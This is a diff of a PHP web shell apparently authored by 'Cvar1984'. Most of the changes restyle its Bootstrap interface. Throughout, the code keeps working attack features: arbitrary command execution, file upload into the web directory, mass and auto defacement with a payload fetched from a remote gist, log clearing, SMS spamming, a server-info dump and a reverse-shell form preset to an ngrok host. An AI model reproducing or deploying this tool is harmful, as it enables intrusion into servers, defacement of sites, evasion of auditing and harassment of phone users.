@@ -175,61 +175,47 @@ if (!isset($_SESSION[sha1(md5($_SERVER['HTTP_HOST'])) ])) {
 							<div class="dropdown">
 								<button style="width:100%;" class="btn btn-success dropdown-toggle" type="button" id="dropdownMenuButton" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">Choose</button>
 								<div class="dropdown-menu" aria-labelledby="dropdownMenuButton">
-									<a class="dropdown-item" href='?do=cmd'>Command Line</a>
-									<a class="dropdown-item" href='?do=sms'>Spam SMS</a>
-									<a class="dropdown-item" href='?do=music'>Music</a>
-									<a class="dropdown-item" href='?do=jumping'>Jumping</a>
-									<a class="dropdown-item" href='?do=config'>Config</a>
-									<a class="dropdown-item" href='?do=mass_deface'>Mass Deface</a>
-									<a class="dropdown-item" href='?do=info'>Server Info</a>
-									<a class="dropdown-item" href='?do=logs'>Clear Logs</a>
-									<a class="dropdown-item" href='?do=cgi'>CGI Shell</a>
-									<a class="dropdown-item" href='?do=deface'>Auto Deface</a>
-									<a class="dropdown-item" href='?do=shortlink'>Shortlink Generator</a>
-									<a class="dropdown-item" href='?do=network'>Network</a>
+									<a class="dropdown-item" href='?path=<?php print @cwd() ?>&do=cmd'>Command Line</a>
+									<a class="dropdown-item" href='?path=<?php print @cwd() ?>&do=sms'>Spam SMS</a>
+									<a class="dropdown-item" href='?path=<?php print @cwd() ?>&do=music'>Music</a>
+									<a class="dropdown-item" href='?path=<?php print @cwd() ?>&do=jumping'>Jumping</a>
+									<a class="dropdown-item" href='?path=<?php print @cwd() ?>&do=config'>Config</a>
+									<a class="dropdown-item" href='?path=<?php print @cwd() ?>&do=mass_deface'>Mass Deface</a>
+									<a class="dropdown-item" href='?path=<?php print @cwd() ?>&do=info'>Server Info</a>
+									<a class="dropdown-item" href='?path=<?php print @cwd() ?>&do=logs'>Clear Logs</a>
+									<a class="dropdown-item" href='?path=<?php print @cwd() ?>&do=cgi'>CGI Shell</a>
+									<a class="dropdown-item" href='?path=<?php print @cwd() ?>&do=deface'>Auto Deface</a>
+									<a class="dropdown-item" href='?path=<?php print @cwd() ?>&do=shortlink'>Shortlink Generator</a>
+									<a class="dropdown-item" href='?path=<?php print @cwd() ?>&do=network'>Network</a>
 								</div>
 							</div>
 						</div>
 				    <div class="w-100"></div>
 				    <div class="col tool">
-						  	<select name="type" class="custom-select">
-				 				<option value="file">File</option>
-				 				<option value="folder">Folder</option>
-				 			</select>
-						  </div>
+				    	<?php
+				    	if (isset($_POST['upl'])) {
+				    		if (copy($_FILES['file']['tmp_name'], @cwd() . DIRECTORY_SEPARATOR . $_FILES['file']['name'])) {
+				    			alert("Upload Success");
+				    		} else {
+				    			alert("Upload Failed");
+				    		}
+				    	}
+				    	?>
+				    	<form method="post" enctype="multipart/form-data">
+				    		<input class="btn" type="file" name="file" />
+				    </div>
 				      <div class="col tool">
-						  	<input class="form-control" type="text" name="filename" placeholder="filename.php">
-						  </div>
+				      	<input style="width:100%;" class="btn btn-success" name="upl" type="submit" value="Save">
+				      </div>
 					<div class="w-100">
 						<div class="col tool">
-				 			<textarea name="text" class="form-control tool" placeholder="if you want to make the folder empty this textarea"></textarea>
-						  </div>
-					</div>
-					<div class="w-100">
+						</div>
 						<div class="col tool">
-							<input class="btn btn-success" type="submit" name="submit" style="width:100%;">
 						</div>
 					</div>
-				</div></form>
+					<div class="w-100"></div>
+				</form></form>
 				      </div>
-				 <?php
-				 if (isset($_POST['submit'])) {
-				 	if ($_POST['type'] == 'file') {
-				 		if (@makefile($_POST['filename'], $_POST['text'])) {
-				 			@alert("Success");
-				 		} else {
-				 			@alert("Failed");
-				 		}
-				 	}
-				 	if ($_POST['type'] == 'folder') {
-				 		if (@makedir($_POST['filename'])) {
-				 			@alert("Success");
-				 		} else {
-				 			@alert("Failed");
-				 		}
-				 	} 
-				 }
-				 ?>
 				</div>
 		</td>
 	</tr>
@@ -256,6 +242,33 @@ function pwd() {
       }
     } print("'>".$pwd."</a>/");
   }
+}
+function making() {
+	if (isset($_POST['submit'])) {
+				 	if ($_POST['type'] == 'file') {
+				 		if (@makefile($_POST['filename'], $_POST['text'])) {
+				 			@alert("Success");
+				 		} else {
+				 			@alert("Failed");
+				 		}
+				 	}
+				 	if ($_POST['type'] == 'folder') {
+				 		if (@makedir($_POST['filename'])) {
+				 			@alert("Success");
+				 		} else {
+				 			@alert("Failed");
+				 		}
+				 	} 
+				 }
+?>
+<select name="type" class="custom-select">
+				 				<option value="file">File</option>
+				 				<option value="folder">Folder</option>
+				 			</select>
+<input class="form-control" type="text" name="filename" placeholder="filename.php">
+<textarea name="text" class="form-control tool" placeholder="if you want to make the folder empty this textarea"></textarea>
+<input class="btn btn-success" type="submit" name="submit" style="width:100%;">
+<?php
 }
 function makefile($filename, $text) {
   $fp = @fopen(@cwd().DIRECTORY_SEPARATOR.$filename, "w");
@@ -371,12 +384,21 @@ function hapus($dir)
 
 function spamsms() {
 ?>
-<center>
-		<h2>Multi Spam SMS</h2>
-		<form method="post">
-			<textarea name="no" class="form-control" id="textarea"
-				placeholder='No HP ex : 888218005037 ' required cols="" rows=""></textarea>
-			<br> <input type="submit" name="action" class="btn btn-danger" />
+<tr>
+	<thead class="thead-light">
+		<th>Multi Spam SMS</th>
+	</thead>
+	<form method="post">
+		<tr>
+			<td>
+				<textarea style="height:350px;" name="no" class="form-control" id="textarea" placeholder='No HP ex : 888218005037 ' required cols="" rows=""></textarea>
+			</td>
+		</tr>
+		<tr>
+			<td>
+				<input style="width:100%;" type="submit" name="action" class="btn btn-success" />
+			</td>
+		</tr>
 		</form>
 	</center>
 <?php
@@ -404,9 +426,13 @@ function spamsms() {
 
 function music()
 {
-	echo "<center>";
-	echo "<iframe width='700px' height='500px' scrolling='no' frameborder='no' src='https://w.soundcloud.com/player/?url=https://api.soundcloud.com/playlists/355874911&amp;color=#00cc11&amp;auto_play=true&amp;hide_related=false&amp;show_comments=true&amp;show_user=true&amp;show_reposts=false&amp;show_teaser=true&amp;visual=true'></iframe>";
-	echo "</center>";
+	?>
+	<tr>
+		<td>
+			<iframe width='100%' height='500px' scrolling='no' frameborder='no' src='https://w.soundcloud.com/player/?url=https://api.soundcloud.com/playlists/355874911&amp;color=#00cc11&amp;auto_play=true&amp;hide_related=false&amp;show_comments=true&amp;show_user=true&amp;show_reposts=false&amp;show_teaser=true&amp;visual=true'></iframe>
+		</td>
+	</tr>
+	<?php
 	die();
 }
 
@@ -542,7 +568,13 @@ function mass_deface_main()
 				} else {
 					if(is_dir($dirc)) {
 						if(is_writable($dirc)) {
-							echo "[<font color=lime>DONE</font>] $lokasi<br>";
+							?>
+							<tr>
+								<td>
+									<?php print $lokasi ?> <font color="lime" style="float:right;">[ DONE ]</font>
+								</td>
+							</tr>
+							<?php
 							file_put_contents($lokasi, $isi_script);
 							$idx = mass_deface($dirc,$namafile,$isi_script);
 						}
@@ -557,16 +589,33 @@ function mass_deface_main()
 			echo "</div>";
 	} else {
 		?>
-	<center><center><h2>Mass Deface</h2></center>
+	<tr>
+		<thead class="thead-light">
+			<th>Mass Deface</th>
+		</thead>
+	</tr>
 	<form method='post'>
-	Folder:<br>
-	<input type='text' class='input-sm' id='input' name='d_dir' value='<?php echo $dir;?>'><br>
-	Filename:<br>
-	<input type='text' class='input-sm' id='input' name='d_file' value='index.php'><br>
-	Content:<br>
-	<textarea type='text' class='form-control' id='textarea' name='script' ><?php echo file_get_contents('https://gist.githubusercontent.com/Cvar1984/3bfdd8d2c09f8889440a9f74f6114a04/raw/899508d80ec7eba573bfb91af082586e26bf71e4/index.php');?></textarea><br>
-	<input type='submit' name='action' class='btn btn-danger ' value='Deface' style='width: 450px;'>
-	</form></center>
+	<tr>
+		<td>
+			<input type='text' class='form-control' id='input' name='d_dir' value='<?php echo $dir;?>'>
+		</td>
+	</tr>
+	<tr>
+		<td>
+			<input type='text' class='form-control' id='input' name='d_file' value='index.php'>
+		</td>
+	</tr>
+	<tr>
+		<td>
+			<textarea style='height:350px;' type='text' class='form-control' id='textarea' name='script' ><?php echo file_get_contents('https://gist.githubusercontent.com/Cvar1984/3bfdd8d2c09f8889440a9f74f6114a04/raw/899508d80ec7eba573bfb91af082586e26bf71e4/index.php');?></textarea>
+		</td>
+	</tr>
+	<tr>
+		<td>
+			<input type='submit' name='action' class='btn btn-success ' value='Deface' style='width:100%;'>
+		</td>
+	</tr>
+	</form>
 	<?php
 	}
 	die();
@@ -582,11 +631,21 @@ function info()
 		$dist = ini_get('disable_functions');
 	}
 ?>
-   <center>
-   	<h5><?php echo php_uname();?></h5>
-   	<h5>Disabled Function : <?php echo $dist;?> </h5>
-		<textarea class="form-control" id="textarea" readonly /><?php var_dump($_SERVER);?></textarea>
-	</center>
+<tr>
+	<thead class="thead-light">
+		<th>Server Info</th>
+	</thead>
+</tr>
+<tr>
+	<td>
+		<center><?php print @php_uname() ?><br>Disabled Function : <?php echo $dist;?></center>
+	</td>
+</tr>
+<tr>
+	<td>
+		<textarea style="height:400px;" class="form-control" id="textarea" readonly /><?php var_dump($_SERVER);?></textarea>
+	</td>
+</tr>
 	<?php
 	die();
 }
@@ -867,10 +926,17 @@ function edit($filename)
 	         <thead class="thead-light">
 			<tr>
 				<th>
-					<h5>Filename : <?php echo $filename; ?></h5>
+					<h5>Filename : <?php echo @basename($filename); ?></h5>
 				</th>
 			</tr>
 		</thead>
+		<tr>
+			<td>
+				<center>
+					<?php print @pwd() ?>
+				</center>
+			</td>
+		</tr>
 			<tr>
 				<td>
 					<textarea style="height:350px;" name="text" class="form-control" id="textarea" cols="" rows=""><?php echo htmlspecialchars($text); ?></textarea>
@@ -925,19 +991,35 @@ function cmd($cmd) {
 
 function cmd_ui()
 {
-	echo "<center><h2>Command Line</h2></center>";
-	if (isset($_POST['command'])) {
-		echo "<center><textarea id='textarea' class='form-control' readonly>" . cmd($_POST['command']) . "</textarea></center>";
-	}
 ?>
-<center>
-		<form method="post">
-			<input type="text" class='input-sm' id='input' style='background-color:black;' name="command" /> <input
-				type="submit" class="btn btn-danger" />
+<tr>
+	<thead class="thead-light">
+		<th>Command Line</th>
+	</thead>
+</tr>
+<form method="post">
+<tr>
+	<td>
+		<input type="text" class='form-control' id='input' name="command" />
+	</td>
+</tr>
+<tr>
+	<td>
+		<input style="width:100%;" type="submit" class="btn btn-success" />
+	</td>
+</tr>
 		</form>
-	</center>
-	<form></form>
 <?php
+	if (isset($_POST['command'])) {
+		?>
+		<tr>
+			<td>
+				<textarea id="textarea" class="form-control" readonly><?php print @cmd($_POST['command']) ?></textarea>
+			</td>
+		</tr>
+		<?php
+		
+	}
 	die();
 }
 
@@ -1112,35 +1194,37 @@ function ngindex()
 		}
 	}
 ?>
-<center><h2>Auto Deface With Backup</h2></center>
+<tr>
+	<thead class="thead-light">
+		<th>
+			Auto Deface With Backup
+		</th>
+	</thead>
+</tr>
 <form method='post'>
 		<tr>
-			<td>Title</td> <td>:</td>
-			<td><input type='text' class='input-sm' id='input' value='Hacked By Cvar1984' name='title'></td>
+			<td><input type='text' class='form-control' id='input' placeholder="Hacked By Cvar1984" name='title'></td>
 			</tr>
 		<tr>
-			<td>Alert Message</td> <td>:</td> 
-			<td><input type='text' class='input-sm' id='input' value='Just Joke :v' name='alert'></td>
+			<td><input type='text' class='form-control' id='input' placeholder="Just Joke :v" name='alert'></td>
 			</tr>
 		<tr>
-			<td>Music Link</td> <td>:</td> 
-			<td><input type='text' class='input-sm' id='input' value='https://cvar1984.github.io/bg.mp3' name='music'></td>
+			<td><input type='text' class='form-control' id='input' placeholder="Music Link" name='music'></td>
 			</tr>
 		<tr>
-			<td>Image Link</td> <td>:</td> 
-			<td><input type='text' class='input-sm' id='input' value='https://cvar1984.github.io/logo.png' name='images'></td>
+			<td><input type='text' class='form-control' id='input' placeholder="Image Link" name='images'></td>
 			</tr>
 		<tr>
-			<td>Content</td> <td>:</td>
-			<td><input type='text' class='input-sm' id='input' value='Hacked By Cvar1984' name='content'></td>
+			<td><input type='text' class='form-control' id='input' placeholder="Hacked By Cvar1984" name='content'></td>
 			</tr>
 		<tr>
-			<td>Sub Content</td> <td>:</td>
-			<td><input type='text' class='input-sm' id='input' value='This Pain Is Wonderful' name='sub_content'></td>
+			<td><input type='text' class='form-control' id='input' placeholder="Sub Content" name='sub_content'></td>
 			</tr>
-		<center>
-			<br /><input type='submit' class='btn btn-danger' name='action' value='Deface'>
-		</center>
+		<tr>
+			<td>
+				<input style="width:100%;" type='submit' class='btn btn-success' name='action' value='Deface'>
+			</td>
+		</tr>
 </form>
 	<?php
 	die();
@@ -1175,21 +1259,27 @@ function short_link()
 		}
 		else {
 			echo "<center><textarea id='textarea' class='form-control' readonly>" . $json->id . "</textarea></center>";
+			die();
 		}
 	}
 
 ?>
 <form method='post'>
-		<tr>
-			<td>Link</td>
-			<td>:</td>
-			<td>
-				<input type='text' class='input-sm' id='input' name='link'>
-			</td>
-		</tr>
-	<center>
-		<br />
-		<input type='submit' class='btn btn-danger' name='action'>
+	<tr>
+		<thead class="thead-light">
+			<th>Shortlink Generator</th>
+		</thead>
+	</tr>
+	<tr>
+		<td>
+			<input type='text' class='form-control' id='input' name='link' placeholder="your link">
+		</td>
+	</tr>
+	<tr>
+		<td>
+			<input style="width:100%;" type='submit' class='btn btn-success' name='action'>
+		</td>
+	</tr>
 	</center>
 </form>
 <?php
@@ -1327,21 +1417,25 @@ function network()
 		proc_close($process);
 	} else {
 ?>
-<center>
-<h2>Reverse Shell</h2>
 <form method='post'>
-
+<tr>
+	<thead class="thead-light">
+		<th>Reverse Shell</th>
+	</thead>
+</tr>
 	<tr>
-		<td align="center"><input type='text' class='input-sm' id='input' value='0.tcp.ngrok.io' name='ip'/></td>
+		<td>
+			<input type='text' class='form-control' id='input' value='0.tcp.ngrok.io' name='ip'/>
+		</td>
 	</tr>
 	<tr>
-		<td align="center"><input type='text' class='input-sm' id='input' value='666' name='port'/></td>
+		<td>
+			<input type='text' class='form-control' id='input' value='666' name='port'/>
+		</td>
 	</tr>
 	<tr>
-		<td colspan="3">
-			<center>
-				<input type='submit' class='btn btn-danger' name='action' value='Open Connection'/>
-			</center>
+		<td>
+			<input style="width:100%;" type='submit' class='btn btn-success' name='action' value='Open Connection'/>
 		</td>
 	</tr>
 </form>
@@ -1571,19 +1665,6 @@ if (isset($_POST['upl'])) {
 		alert("Upload Failed");
 	}
 }
-//echo "
-//<thead class="thead-light">
-//<tr>
-//	<th colspan="4">
-//	<form method="post" enctype="multipart/form-data">
-//		<center>
-//			<input class="btn" type="file" name="file" />
-//			<input class="btn btn-danger" name="upl" type="submit" value="Save">
-//		</center>
-//	</form>
-//</th>
-//</tr>
-//</thead> ";
 ?>
 </table>
 </body>
